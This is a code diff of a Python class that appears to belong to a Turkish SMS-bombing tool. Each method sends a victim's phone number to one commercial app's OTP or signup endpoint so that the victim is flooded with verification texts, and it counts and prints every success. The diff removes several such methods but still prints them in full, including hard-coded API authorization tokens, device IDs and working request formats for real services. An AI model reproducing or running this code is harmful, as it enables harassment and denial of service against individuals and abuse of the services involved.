@@ -210,22 +210,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mopas.com.tr")
-          
-
-    #suiste.com
-    def Suiste(self):
-        try:
-            url = "https://suiste.com:443/api/auth/code"
-            headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Mobillium-Device-Id": "56DB9AC4-F52B-4DF1-B14C-E39690BC69FC", "User-Agent": "suiste/1.6.16 (com.mobillium.suiste; build:1434; iOS 15.7.7) Alamofire/5.6.4", "Accept-Language": "en"}
-            data = {"action": "register", "gsm": self.phone}
-            r = requests.post(url, headers=headers, data=data)
-            if r.json()["code"] == "common.success":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
                 
     
     #KimGbIster
@@ -239,38 +223,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
-            
-
-    #tazi.tech
-    def Tazi(self):
-        try:
-            url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
-            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
-            json={"cep_tel": self.phone, "cep_tel_ulkekod": "90"}
-            r = requests.post(url, headers=headers, json=json)
-            if (r.json()["kod"]) == "0000":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapiv2.tazi.tech")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapiv2.tazi.tech")
-            
-    
-    #n11.com
-    def N11(self):
-        try:
-            url = "https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3"
-            headers = {"Mobileclient": "IOS", "Content-Type": "application/json", "Accept": "*/*", "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F", "Clientversion": "163", "Accept-Encoding": "gzip, deflate", "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Connection": "close"}
-            json={"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": self.mail, "gsmNumber": self.phone, "userType": "BUYER"}
-            r = requests.post(url, headers=headers, json=json)
-            if (r.json()["isSuccess"]) == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.n11.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.n11.com")
             
         
     #marti.tech
@@ -286,23 +238,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com")
-
-
-    #macrocenter.com.tr
-    def Macro(self):
-        try:
-            url = "https://rest.macrocenter.com.tr:443/users/login/otp"
-            headers = {"Content-Type": "application/json", "X-Device-Platform": "IOS", "X-Request-Identifier": "2C1B6BBB-3E1E-4E7E-9CAE-990C6EAAD279", "Accept": "*/*", "X-Device-Model": "iPhone 7 Plus", "X-Store-Ids": "", "X-Device-Version": "2.3.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-Device-Platform-Version": "15.7.7", "User-Agent": "Macrocenter/15 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Identifier": "C7CF9525-9BEB-47B0-87EF-FAFA9F778C3E", "X-Device-Latitude": "", "X-Device-Longitude": "", "X-Device-Type": "MOBILE"}
-            json={"phoneNumber": self.phone}
-            r = requests.post(url, headers=headers, json=json)
-            if r.json()["successful"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.macrocenter.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.macrocenter.com.tr")
-
 
     #tiklagelsin.com
     def TiklaGelsin(self):
@@ -365,22 +300,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> koton.com")
-
-
-    #pisir.com
-    def Pisir(self):
-        try:
-            url = "https://api.pisir.com:443/v1/login/"
-            headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Pisir/386 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
-            json={"app_build": "386", "app_platform": "ios", "msisdn": f"+90{self.phone}"}
-            r = requests.post(url, headers=headers, json=json)
-            if r.json()["ok"] == "1":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.pisir.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.pisir.com")
 
 
     #hizliecza.com.tr
@@ -446,38 +365,6 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pyb-mobileapi.walletgate.io")
 
-        
-    #migros.com.tr
-    def Migros(self):
-        try:
-            url = "https://rest.migros.com.tr:443/hemen/users/login/otp"
-            headers = {"Content-Type": "application/json", "X-Device-Platform": "IOS", "X-Request-Identifier": "6059F027-F6BC-41A9-93E6-77FB388DA19B", "Accept": "*/*", "X-Device-Model": "iPhone 7 Plus", "X-Store-Ids": "", "X-Device-Version": "10.5.2", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-Device-Platform-Version": "15.7.7", "User-Agent": "Migros/1690 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Identifier": "DA391FD6-7299-4A4E-A35E-1D3090547582", "X-Device-Latitude": "", "X-Device-Longitude": "", "X-Device-Type": "MOBILE"}
-            json={"phoneNumber": self.phone}
-            r = requests.post(url, headers=headers, json=json)
-            if r.json()["successful"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.migros.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.migros.com.tr")
-
-
-    #file.com.tr
-    def File(self):
-        try:
-            url = "https://api.filemarket.com.tr:443/v1/otp/send"
-            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
-            json={"mobilePhoneNumber": f"90{self.phone}"}
-            r = requests.post(url, headers=headers, json=json)
-            if r.json()["responseType"] == "SUCCESS":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.filemarket.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.filemarket.com.tr")
-
 
     #roombadi.com
     def Roombadi(self):
@@ -493,37 +380,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.roombadi.com")
-    
-
-    #komagene.com.tr
-    def Komagene(self):
-        try:
-            url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
-            json={"Telefon": self.phone,"FirmaId": "32"}
-            headers = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"}
-            r = requests.post(url=url, headers=headers, json=json)
-            if r.json()["Success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gateway.komagene.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gateway.komagene.com.tr")
-    
-    
-    #kuryemgelsin.com
-    def KuryemGelsin(self):
-        try:
-            url = "https://api.kuryemgelsin.com:443/en/api/users/registerMessage/"
-            json={"phoneNumber": self.phone, "phone_country_code": "+90"}
-            r = requests.post(url=url, json=json)
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.kuryemgelsin.com 3 hak")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.kuryemgelsin.com 3 hak")
     
     
     #porty.tech
@@ -555,33 +411,3 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> service.taksim.digital")
-    
-    
-    #tasimacim.com
-    def Tasimacim(self):
-        try:
-            url = "https://server.tasimacim.com/requestcode"
-            json= {"phone": self.phone, "lang": "tr"}
-            r = requests.post(url=url, json=json)
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> server.tasimacim.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> server.tasimacim.com")
-    
-    
-    #yuffi.co
-    def Yuffi(self):
-        try:
-            url = "https://api.yuffi.co/api/parent/login/user"
-            json = {"phone": self.phone, "kvkk": True}
-            r = requests.post(url, json=json)
-            if r.json()["success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.yuffi.co")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yuffi.co")
